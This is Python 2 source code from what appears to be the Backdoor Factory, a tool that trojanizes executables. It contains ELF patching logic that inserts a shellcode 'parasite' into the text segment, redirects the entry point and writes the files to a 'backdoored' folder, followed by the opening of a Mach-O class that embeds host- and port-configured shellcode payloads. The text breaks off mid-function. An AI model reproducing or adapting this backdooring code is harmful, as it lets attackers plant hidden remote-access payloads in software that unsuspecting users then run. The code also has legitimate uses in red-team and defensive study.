        #section tables
        if self.e_phoff > os.path.getsize(self.FILE):
            print ""[!] El fuzzero""
            return False
        bin.seek(self.e_phoff, 0)
            
        #header tables
        if self.e_shnum == 0:
            print ""[*] More than 0xFF00 sections""
            print ""[*] NOPE NOPE NOPE""
            return False
            
        else:
            self.real_num_sections = self.e_shnum

        if self.e_phoff > self.file_size:
            print ""[*] e_phoff is greater than file size""
            return False

        bin.seek(self.e_phoff, 0)
        self.prog_hdr = {}
        for i in range(self.e_phnum):
            self.prog_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                if self.e_phoff + (self.e_phnum * 4 * 8) > self.file_size:
                    print ""[!] e_phoff and e_phnum is greater than the file size""
                    return False
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
            else:
                if self.e_phoff + (self.e_phnum * ((4 * 2) + (6 * 8))) > self.file_size:
                    print ""[!] e_phoff and e_phnum is greater than the file size""
                    return False
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
            if self.prog_hdr[i]['p_type'] == 0x1 and self.prog_hdr[i]['p_vaddr'] < self.e_entry:
                self.offset_addr = self.prog_hdr[i]['p_vaddr']
                self.LocOfEntryinCode = self.e_entry - self.offset_addr
                #print ""found the entry offset""

        if self.e_shoff > self.file_size:
            print ""[!] e_shoff location is greater than file size""
            return False
        if self.e_shnum  > self.file_size:
            print ""[!] e_shnum is greater than file size""
            return False    
        bin.seek(self.e_shoff, 0)
        self.sec_hdr = {}
        for i in range(self.e_shnum):
            self.sec_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                if self.e_shoff + self.e_shnum * 4 *10 > self.file_size:
                    print ""[!] e_shnum is greater than file size""
                    return False    
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
            else:
                if self.e_shoff + self.e_shnum * ((4 * 4) + (6 * 8))   > self.file_size:
                    print ""[!] e_shnum is greater than file size""
                    return False
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + ""I"", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
        
        if self.set_section_name() is False:
            print ""[!] Fuzzing sections""
            return False
        if self.e_type != 0x2:
            print ""[!] Only supporting executable elf e_types, things may get weird.""

        return True

    def output_options(self):
        """"""
        Output file check.
        """"""
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    def patch_elf(self):
        '''
        Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
        6. Increase p_shoff by PAGE_SIZE in the ELF header
        7. Patch the insertion code (parasite) to jump to the entry point (original)
        1. Locate the text segment program header
            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
            -Increase p_filesz by account for the new code (parasite)
            -Increase p_memsz to account for the new code (parasite)
        2. For each phdr who's segment is after the insertion (text segment)
            -increase p_offset by PAGE_SIZE
        3. For the last shdr in the text segment
            -increase sh_len by the parasite length
        4. For each shdr who's section resides after the insertion
            -Increase sh_offset by PAGE_SIZE
        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
            into the file - text segment p_offset + p_filesz (original)
        '''

        self.support_check()
        
        if self.supported is False:
            print ""[!] ELF Binary not supported""
            return False

        gather_result = self.gather_file_info()
        if gather_result is False:
            print ""[!] Are you fuzzing?""
            return False
        
        self.output_options()

        if self.PREPROCESS is True:
            print ""True""
            self.preprocess()

        if not os.path.exists(""backdoored""):
            os.makedirs(""backdoored"")
        os_name = os.name
        if os_name == 'nt':
            self.backdoorfile = ""backdoored\\"" + self.OUTPUT
        else:
            self.backdoorfile = ""backdoored/"" + self.OUTPUT

        shutil.copy2(self.FILE, self.backdoorfile)

        print ""[*] Getting shellcode length""

        resultShell = self.set_shells()
        if resultShell is False:
            print ""[!] Could not set shell""
            return False
        self.bin_file = open(self.backdoorfile, ""r+b"")

        newBuffer = len(self.shellcode)

        self.bin_file.seek(24, 0)

        headerTracker = 0x0
        PAGE_SIZE = 4096
        newOffset = None
        #find range of the first PT_LOAD section
        for header, values in self.prog_hdr.iteritems():
            #print 'program header', header, values
            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                #print ""Found text segment""
                self.shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                beginOfSegment = values['p_vaddr']
                oldentry = self.e_entry
                sizeOfNewSegment = values['p_memsz'] + newBuffer
                LOCofNewSegment = values['p_filesz'] + newBuffer
                headerTracker = header
                newOffset = values['p_offset'] + values['p_filesz']

        #now that we have the shellcode startpoint, reassgin shellcode,
        #  there is no change in size
        print ""[*] Setting selected shellcode""

        resultShell = self.set_shells()

        #SPLIT THE FILE
        self.bin_file.seek(0)
        if newOffset > 4294967296 or newOffset is None:
            print ""[!] Fuzz Fuzz Fuzz the bin""
            return False
        if newOffset > self.file_size:
            print ""[!] The file is really not that big""
            return False
        
        file_1st_part = self.bin_file.read(newOffset)
        #print file_1st_part.encode('hex')
        newSectionOffset = self.bin_file.tell()
        file_2nd_part = self.bin_file.read()

        self.bin_file.close()
        #print ""Reopen file for adjustments""
        self.bin_file = open(self.backdoorfile, ""w+b"")
        self.bin_file.write(file_1st_part)
        self.bin_file.write(self.shellcode)
        self.bin_file.write(""\x00"" * (PAGE_SIZE - len(self.shellcode)))
        self.bin_file.write(file_2nd_part)
        if self.EI_CLASS == 0x01:
            #32 bit FILE
            #update section header table
            print ""[*] Patching x86 Binary""
            self.bin_file.seek(24, 0)
            self.bin_file.seek(8, 1)
            if self.e_shoff + PAGE_SIZE > 4294967296:
                print ""[!] Such fuzz...""
                return False
            self.bin_file.write(struct.pack(self.endian + ""I"", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print ""i"", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print ""Adding page size""
                    if self.sec_hdr[i]['sh_offset'] + PAGE_SIZE > 4294967296:
                        print ""[!] Melkor is cool right?""
                        return False
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + ""I"", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(20, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:
                    #print ""adding newBuffer size""
                    if self.sec_hdr[i]['sh_offset'] + newBuffer > 4294967296:
                        print ""[!] Someone is fuzzing...""
                        return False
                    self.bin_file.seek(20, 1)
                    self.bin_file.write(struct.pack(self.endian + ""I"", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(16, 1)
                else:
                    self.bin_file.seek(40, 1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff, 0)
            for i in range(self.e_phnum):
                #print ""header range i"", i
                #print ""self.shellcode_vaddr"", hex(self.prog_hdr[i]['p_vaddr']), hex(self.shellcode_vaddr)
                if i == headerTracker:
                    #print ""Found Text Segment again""
                    after_textSegment = True
                    self.bin_file.seek(16, 1)
           
                    if self.prog_hdr[i]['p_filesz'] + newBuffer > 4294967296:
                        print ""[!] Melkor you fuzzer you...""
                        return False
                    if self.prog_hdr[i]['p_memsz'] + newBuffer > 4294967296:
                        print ""[!] Someone is a fuzzing...""
                        return False
                    self.bin_file.write(struct.pack(self.endian + ""I"", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + ""I"", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print ""Increasing headers after the addition""
                    self.bin_file.seek(4, 1)
                    if self.prog_hdr[i]['p_offset'] + PAGE_SIZE > 4294967296:
                        print ""[!] Nice Fuzzer!""
                        return False
                    self.bin_file.write(struct.pack(self.endian + ""I"", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(32, 1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            if self.shellcode_vaddr >= 4294967295:
                print ""[!] Oh hai Fuzzer!""
                return False
            self.bin_file.write(struct.pack(self.endian + ""I"", self.shellcode_vaddr))

            self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5

        else:
            #64 bit FILE
            print ""[*] Patching x64 Binary""
            self.bin_file.seek(24, 0)
            self.bin_file.seek(16, 1)
            if self.e_shoff + PAGE_SIZE > 0x7fffffffffffffff:
                print ""[!] Such fuzz...""
                return False
            self.bin_file.write(struct.pack(self.endian + ""I"", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print ""i"", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print ""Adding page size""
                    self.bin_file.seek(24, 1)
                    if self.sec_hdr[i]['sh_offset'] + PAGE_SIZE > 0x7fffffffffffffff:
                        print ""[!] Fuzzing...""
                        return False
                    self.bin_file.write(struct.pack(self.endian + ""Q"", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(32, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:
                    #print ""adding newBuffer size""
                    self.bin_file.seek(32, 1)
                    if self.sec_hdr[i]['sh_offset'] + newBuffer > 0x7fffffffffffffff:
                        print ""[!] Melkor is cool right?""
                        return False
                    self.bin_file.write(struct.pack(self.endian + ""Q"", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(64, 1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff, 0)
            for i in range(self.e_phnum):
                #print ""header range i"", i
                #print ""self.shellcode_vaddr"", hex(self.prog_hdr[i]['p_vaddr']), hex(self.shellcode_vaddr)
                if i == headerTracker:
                    #print ""Found Text Segment again""
                    after_textSegment = True
                    self.bin_file.seek(32, 1)
                    if self.prog_hdr[i]['p_filesz'] + newBuffer > 0x7fffffffffffffff:
                        print ""[!] Fuzz fuzz fuzz... ""
                        return False
                    if self.prog_hdr[i]['p_memsz'] + newBuffer > 0x7fffffffffffffff:
                        print ""[!] Someone is fuzzing...""
                        return False
                    self.bin_file.write(struct.pack(self.endian + ""Q"", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + ""Q"", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print ""Increasing headers after the addition""
                    self.bin_file.seek(8, 1)
                    if self.prog_hdr[i]['p_offset'] + PAGE_SIZE > 0x7fffffffffffffff:
                        print ""[!] Nice fuzzer!""
                        return False
                    self.bin_file.write(struct.pack(self.endian + ""Q"", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(40, 1)
                else:
                    self.bin_file.seek(56, 1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            if self.shellcode_vaddr > 0x7fffffffffffffff:
                print ""[!] Fuzzing...""
                return False
            self.bin_file.write(struct.pack(self.endian + ""Q"", self.shellcode_vaddr))

            self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5

        self.bin_file.close()

        print ""[!] Patching Complete""

        if self.tmp_file != None:
        
            if self.keep_temp is True:
                # tmpfilename_orginalname.exe
                print ""[*] Saving TempFile to:"", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE 
                shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )
            try:
                shutil.rmtree(self.tmp_file.name)
            except: # OSError:
                pass
                #print ""[*] TempFile already removed.""

        return True"
machobin,"import os
import struct
import shutil
import tempfile
import sys
from intel.MachoIntel64 import macho_intel64_shellcode
from intel.MachoIntel32 import macho_intel32_shellcode


class machobin():

    def __init__(self, FILE, OUTPUT=None, SHELL=None, HOST=""127.0.0.1"", PORT=8080,
                 SUPPORT_CHECK=False, SUPPLIED_SHELLCODE=None, FAT_PRIORITY=""x64"",
                 BEACON=15, PREPROCESS=False
                 ):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.fat_hdrs = {}
        self.mach_hdrs = {}
        self.load_cmds = {}
        self.ImpValues = {}
        self.jumpLocation = 0x0
        self.PORT = PORT
        self.HOST = HOST
        self.SHELL = SHELL
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.FAT_FILE = False
        self.FAT_PRIORITY = FAT_PRIORITY
        self.BEACON = BEACON
        self.PREPROCESS = PREPROCESS
        self.ORIGINAL_FILE = self.FILE
        self.tmp_file = None
        self.keep_temp = False
        self.supported_CPU_TYPES = [0x7,  # i386
                                    0x01000007  # x64
                                    ]

    def run_this(self):
        'The Engine'
        self.bin = open(self.FILE, 'r+b')
        self.supported = ''
        if self.SUPPORT_CHECK is True:
            #Exit out either way
            if not self.FILE:
                print ""You must provide a file to see if it is supported (-f)""
                return False
            try:
                self.support_check()
            except Exception, e:
                print 'Exception:', str(e), '%s' % self.FILE
            if self.supported is False:
                print ""%s is not supported."" % self.FILE
                return False
            else:
                print ""%s is supported."" % self.FILE
                return True

        self.support_check()
        result = self.patch_macho()
        return result

    def support_check(self):
        print ""[*] Checking file support""
        with open(self.FILE, 'r+b') as self.bin:
            check = self.get_structure()
            if check is False:
                self.supported = False

            for key, value in self.load_cmds.iteritems():
                self.ImpValues[key] = self.find_Needed_Items(value)
                if self.ImpValues[key]['text_segment'] == {}:
                    print '[!] Not a proper Mach-O file'
                    self.supported = False

    
    def loadthis(self, amod):
        section = amod.split('.')
        mod = ""."".join(section[:-1])
        amod = __import__(mod)
        for item in section[1:]:
            amod = getattr(amod, item)
        return amod

    def preprocess(self):
        # files in directory
        ignore = ['__init__.py']
        abspath = os.path.abspath(__file__)
        dname = os.path.dirname(abspath)
        sys.path.append(dname)
        for afile in os.listdir(dname + ""/preprocessor""):
            if afile in ignore:
                continue
            if "".pyc"" in afile:
                continue
            
            if len(afile.split(""."")) > 2:
                print ""!"" * 50
                print ""\t[!] Make sure there are no '.' in your preprocessor filename:"", afile
                print ""!"" * 50
                
                return False
            
            name = ""preprocessor."" +  afile.strip("".py"")
            
            preprocessor_name = __import__( name, fromlist=[''])
            
            if preprocessor_name.enabled is True:
                print ""[*] Executing preprocessor:"", afile.strip("".py"")
            else:
                continue

            if preprocessor_name.file_format.lower() in ['macho', 'all']: #'elf', 'macho', 'mach-o']:
                print '[*] Running preprocessor', afile.strip("".py""), ""against"", preprocessor_name.file_format, ""formats""
            else:
                continue
            
            # Allow if any processors to keep it 
            if self.keep_temp is False:
                self.keep_temp = preprocessor_name.keep_temp
            
            # create tempfile here always
            
            if self.tmp_file == None:
                self.tmp_file = tempfile.NamedTemporaryFile()
                self.tmp_file.write(open(self.FILE, 'rb').read())
                self.tmp_file.seek(0)
                print ""[*] Creating temp file:"", self.tmp_file.name
            else:
                print ""[*] Using existing tempfile from prior preprocessor""
            
            load_name = name +  "".preprocessor""
            preproc = self.loadthis(load_name)
            
            m = preproc(self)
            
            print ""="" * 50
            
            # execute preprocessor
            result = m.run()
            
            if result is False:
                print ""[!] Preprocessor Failure :(""

            print ""="" * 50
            
            # After running push it to BDF.
            
            self.FILE = self.tmp_file.name[:]
    
            # check for support after each modification
            if preprocessor_name.recheck_support is True:
                issupported = self.support_check()
                if issupported is False:
                    print self.FILE, ""is not supported.""
                    return False                

    def output_options(self):
        """"""
        Output file check.
        """"""
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    def set_shells(self, MagicNumber, ):
        ""This function sets the shellcode.""

        print ""[*] Looking for and setting selected shellcode""

        avail_shells = []

        self.bintype = False
        if MagicNumber == '0xfeedface':
            #x86
            self.bintype = macho_intel32_shellcode
        elif MagicNumber == '0xfeedfacf':
            #x64
            self.bintype = macho_intel64_shellcode

        if not self.SHELL:
            print ""You must choose a backdoor to add: ""
            for item in dir(self.bintype):
                if ""__"" in item:
                    continue
                elif (""returnshellcode"" == item
                      or ""pack_ip_addresses"" == item
                      or ""eat_code_caves"" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print ""   {0}"".format(item)
            return False
        if self.SHELL not in dir(self.bintype):
            print ""The following %ss are available:"" % str(self.bintype).split(""."")[1]
            for item in dir(self.bintype):
                #print item
                if ""__"" in item:
                    continue
                elif (""returnshellcode"" == item
                      or ""pack_ip_addresses"" == item
                      or ""eat_code_caves"" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print ""   {0}"".format(item)
                    avail_shells.append(item)
            self.avail_shells = avail_shells
            return False
        #else:
        #    shell_cmd = self.SHELL + ""()""
        self.shells = self.bintype(self.HOST, self.PORT, self.jumpLocation, self.SUPPLIED_SHELLCODE, self.BEACON)
        self.allshells = getattr(self.shells, self.SHELL)()
        self.shellcode = self.shells.returnshellcode()
        return self.shellcode

    def get_structure(self):
        '''This function grabs necessary data for the mach-o format'''
        self.binary_header = self.bin.read(4)
        if self.binary_header == ""\xca\xfe\xba\xbe"":
            print '[*] Fat File detected'
            self.FAT_FILE = True
            ArchNo = struct.unpack("">I"", self.bin.read(4))[0]
            for arch in range(ArchNo):
                self.fat_hdrs[arch] = self.fat_header()
            for hdr, value in self.fat_hdrs.iteritems():
                if int(value['CPU Type'], 16) in self.supported_CPU_TYPES:
                    self.bin.seek(int(value['Offset'], 16), 0)
                    self.mach_hdrs[hdr] = self.mach_header()
                    self.load_cmds[hdr] = self.parse_loadcommands(self.mach_hdrs[hdr])
            if self.mach_hdrs is False:
                return False
        else:
            #Not Fat Header
            self.bin.seek(0)
            self.mach_hdrs[0] = self.mach_header()
            self.load_cmds[0] = self.parse_loadcommands(self.mach_hdrs[0])

    def fat_header(self):
        header = {}
        header[""CPU Type""] = hex(struct.unpack("">I"", self.bin.read(4))[0])
        header[""CPU SubType""] = hex(struct.unpack("">I"", self.bin.read(4))[0])
        header[""Offset""] = hex(struct.unpack("">I"", self.bin.read(4))[0])
        header[""Size""] = hex(struct.unpack("">I"", self.bin.read(4))[0])
        header[""Align""] = hex(struct.unpack("">I"", self.bin.read(4))[0])
        return header

    def mach_header(self):
        header = {}
        header['beginningOfHeader'] = self.bin.tell()
        try:
            header['MagicNumber'] = hex(struct.unpack(""<I"", self.bin.read(4))[0])
        except:
            print ""[!] Not a properly formated Mach-O file""
            return False
        header['CPU Type'] = hex(struct.unpack(""<I"", self.bin.read(4))[0])
        header['CPU SubType'] = hex(struct.unpack(""<I"", self.bin.read(4))[0])
        header['File Type'] = hex(struct.unpack(""<I"", self.bin.read(4))[0])
        header['LOCLoadCmds'] = self.bin.tell()
        header['Load Cmds'] = hex(struct.unpack(""<I"", self.bin.read(4))[0])
        header['LOCSizeLdCmds'] = self.bin.tell()
        header['Size Load Cmds'] = hex(struct.unpack(""<I"", self.bin.read(4))[0])
        header['Flags'] = hex(struct.unpack(""<I"", self.bin.read(4))[0])
        if header['MagicNumber'] == '0xfeedfacf':
            header['Reserved'] = hex(struct.unpack(""<I"", self.bin.read(4))[0])
        header['endOfHeader'] = self.bin.tell()
        return header

    def parse_loadcommands(self, someHdrs):
        #print int(someHdrs['Load Cmds'], 16)
        overall_cmds = []
        for section in range(int(someHdrs['Load Cmds'], 16)):
            cmds = {}
            cmds['Command'] = struct.unpack(""<I"", self.bin.read(4))[0]
            cmds['CommandSize'] = struct.unpack(""<I"", self.bin.read(4))[0]
            cmds['LOCInFIle'] = self.bin.tell()
            cmds['DATA'] = self.bin.read(int(cmds['CommandSize']) - 8)
            cmds['last_cmd'] = self.bin.tell()
            overall_cmds.append(cmds)

        return overall_cmds

    def find_Needed_Items(self, theCmds):
        '''
        This method returns a dict with commands that we need
        for mach-o patching
        '''
        _tempDict = {}
        text_segment = {}
        text_section = {}
        LC_MAIN = {}
        LC_UNIXTREAD = {}
        LC_CODE_SIGNATURE = {}
        LC_DYLIB_CODE_SIGN_DRS = {}

        locationInFIle = 0
        last_cmd = 0
        for item in theCmds:
            locationInFIle = item['LOCInFIle']
            if item['DATA'][0:6] == ""__TEXT"" and item['Command'] == 0x01:
                text_segment = {
                    'segname': item['DATA'][0:0x10],
                    'VMAddress': item['DATA'][0x10:0x14],
                    'VMSize': item['DATA'][0x14:0x18],
                    'File Offset': item['DATA'][0x18:0x1C],
                    'File Size': item['DATA'][0x1C:0x20],
                    'MaxVMProt': item['DATA'][0x20:0x24],
                    'InitalVMProt': item['DATA'][0x24:0x28],
                    'NumberOfSections': item['DATA'][0x28:0x2C],
                    'Flags': item['DATA'][0x2C:0x30]
                }

                count = struct.unpack(""<I"", text_segment['NumberOfSections'])[0]
                i = 0
                while count > 0:
                    if '__text' in item['DATA'][0x30 + i:0x40 + i]:
                        text_section = {
                            'sectionName': item['DATA'][0x30 + i:0x40 + i],
                            'segmentName': item['DATA'][0x40 + i:0x50 + i],
                            'Address': item['DATA'][0x50 + i:0x54 + i],
                            'LOCAddress': locationInFIle + 0x50 + i,
                            'Size': item['DATA'][0x54 + i:0x58 + i],
                            'LOCTextSize': locationInFIle + 0x54 + i,
                            'Offset': item['DATA'][0x58 + i:0x5c + i],
                            'LocTextOffset': locationInFIle + 0x58 + i,
                            'Alignment': item['DATA'][0x5c + i:0x60 + i],
                            'Relocations': item['DATA'][0x60 + i:0x64 + i],
                            'NumberOfRelocs': item['DATA'][0x64 + i:0x68 + i],
                            'Flags': item['DATA'][0x68 + i:0x6c + i],
                            'Reserved1': item['DATA'][0x6c + i:0x70 + i],
                            'Reserved2': item['DATA'][0x70 + i:0x74 + i],
                        }
                        break
                    else:
                        count -= 1
                        i += 0x40

            elif item['DATA'][0:6] == ""__TEXT"" and item['Command'] == 0x19:
                text_segment = {
                    'segname': item['DATA'][0:0x10],
                    'VMAddress': item['DATA'][0x10:0x18],
                    'VMSize': item['DATA'][0x18:0x20],
                    'File Offset': item['DATA'][0x20:0x28],
                    'File Size': item['DATA'][0x28:0x30],
                    'MaxVMProt': item['DATA'][0x30:0x34],
                    'InitalVMProt': item['DATA'][0x34:0x38],
                    'NumberOfSections': item['DATA'][0x38:0x3C],
                    'Flags': item['DATA'][0x3c:0x40]
                }
                count = struct.unpack(""<I"", text_segment['NumberOfSections'])[0]
                i = 0
                while count > 0:

                    if '__text' in item['DATA'][0x40 + i:0x50 + i]:
                        text_section = {
                            'sectionName': item['DATA'][0x40 + i:0x50 + i],
                            'segmentName': item['DATA'][0x50 + i:0x60 + i],
                            'Address': item['DATA'][0x60 + i:0x68 + i],
                            'LOCAddress': locationInFIle + 0x60 + i,
                            'Size': item['DATA'][0x68 + i:0x70 + i],
                            'LOCTextSize': locationInFIle + 0x68 + i,
                            'Offset': item['DATA'][0x70 + i:0x74 + i],
                            'LocTextOffset': locationInFIle + 0x70 + i,
                            'Alignment': item['DATA'][0x74 + i:0x78 + i],
                            'Relocations': item['DATA'][0x78 + i:0x7c + i],
                            'NumberOfRelocs': item['DATA'][0x7c + i:0x80 + i],
                            'Flags': item['DATA'][0x80 + i:0x84 + i],
                            'Reserved1': item['DATA'][0x84 + i:0x88 + i],
                            'Reserved2': item['DATA'][0x88 + i:0x8c + i],
                            'Reserved3': item['DATA'][0x8c + i:0x90 + i],
                        }

                        break
                    else:
                        count -= 1
                        i += 0x4c

            if item['Command'] == 0x80000028:
                LC_MAIN = {
                    'LOCEntryOffset': locationInFIle,
                    'EntryOffset': item['DATA'][0x0:0x8],
                    'StackSize': item['DATA'][0x8:0x16]
                }
            elif item['Command'] == 0x00000005 and struct.unpack(""<I"", item['DATA'][0x0:0x4])[0] == 0x01:
                LC_UNIXTREAD = {
                    'LOCEntryOffset': locationInFIle,
                    'Flavor': item['DATA'][0x00:0x04],
                    'Count': item['DATA'][0x04:0x08],
                    'eax': item['DATA'][0x08:0x0C],
                    'ebx': item['DATA'][0x0C:0x10],
                    'ecx': item['DATA'][0x10:0x14],
                    'edx': item['DATA'][0x14:0x18],
                    'edi': item['DATA'][0x18:0x1C],
                    'esi': item['DATA'][0x1C:0x20],
                    'ebp': item['DATA'][0x20:0x24],
                    'esp': item['DATA'][0x24:0x28],
                    'ss': item['DATA'][0x28:0x2C],
                    'eflags': item['DATA'][0x2C:0x30],
                    'LOCeip': locationInFIle + 0x30,
                    'eip': item['DATA'][0x30:0x34],
                    'cs': item['DATA'][0x34:0x38],
                    'ds': item['DATA'][0x38:0x3C],
                    'es': item['DATA'][0x3C:0x40],
                    'fs': item['DATA'][0x40:0x44],
                    'gs': item['DATA'][0x44:0x48],
                }
            elif item['Command'] == 0x00000005 and struct.unpack(""<I"", item['DATA'][0x0:0x4])[0] == 0x04:
                LC_UNIXTREAD = {
                    'LOCEntryOffset': locationInFIle,
                    'Flavor': item['DATA'][0x00:0x04],
                    'Count': item['DATA'][0x04:0x08],
                    'rax': item['DATA'][0x08:0x10],
                    'rbx': item['DATA'][0x10:0x18],
                    'rcx': item['DATA'][0x18:0x20],
                    'rdx': item['DATA'][0x20:0x28],
                    'rdi': item['DATA'][0x28:0x30],
                    'rsi': item['DATA'][0x30:0x38],
                    'rbp': item['DATA'][0x38:0x40],
                    'rsp': item['DATA'][0x40:0x48],
                    'r8': item['DATA'][0x48:0x50],
                    'r9': item['DATA'][0x50:0x58],
                    'r10': item['DATA'][0x58:0x60],
                    'r11': item['DATA'][0x60:0x68],
                    'r12': item['DATA'][0x68:0x70],
                    'r13': item['DATA'][0x70:0x78],
                    'r14': item['DATA'][0x78:0x80],
                    'r15': item['DATA'][0x80:0x88],
                    'LOCrip': locationInFIle + 0x88,
                    'rip': item['DATA'][0x88:0x90],
                    'rflags': item['DATA'][0x90:0x98],
                    'cs': item['DATA'][0x98:0xA0],
                    'fs': item['DATA'][0xA0:0xA8],
                    'gs': item['DATA'][0xA8:0xB0],
                }

            if item['Command'] == 0x000001D:
                LC_CODE_SIGNATURE = {
                    'Data Offset': item['DATA'][0x0:0x4],
                    'Data Size': item['DATA'][0x0:0x8],
                }

            if item['Command'] == 0x0000002B:
                LC_DYLIB_CODE_SIGN_DRS = {
                    'Data Offset': item['DATA'][0x0:0x4],
                    'Data Size': item['DATA'][0x0:0x8],
                }

            if item['last_cmd'] > last_cmd:
                last_cmd = item['last_cmd']

        _tempDict = {'text_segment': text_segment, 'text_section': text_section,
                     'LC_MAIN': LC_MAIN, 'LC_UNIXTREAD': LC_UNIXTREAD,
                     'LC_CODE_SIGNATURE': LC_CODE_SIGNATURE,
